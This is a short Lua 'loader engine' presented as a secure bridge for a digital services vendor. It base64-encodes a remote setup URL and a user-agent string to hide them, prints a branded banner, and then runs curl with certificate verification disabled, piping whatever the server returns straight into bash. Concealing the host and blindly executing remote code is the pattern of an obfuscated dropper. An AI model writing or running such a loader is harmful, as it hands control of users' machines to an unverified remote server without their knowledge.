-- =============================================================
-- 🚀 SCLOUDS-OMNI v10 - LOADER ENGINE
-- 🛡️ Secure Bridge for Sclouds Digital Services
-- =============================================================

local function decode(str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        return string.char(tonumber(x, 2))
    end))
end

-- Decoded Strings
local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")

-- Clear Terminal & Header
os.execute("clear")
print("\27[0;36m====================================================\27[0m")
print("\27[1;33m          SCLOUDS-OMNI DIGITAL SERVICES             \27[0m")
print("\27[0;36m====================================================\27[0m")
print(" Connecting to Sclouds Server...")

local timestamp = os.time()
local final_url = target .. "?v=" .. timestamp
local cmd = "curl -sL -k -A '" .. ident .. "' '" .. final_url .. "' | bash"

os.execute(cmd)
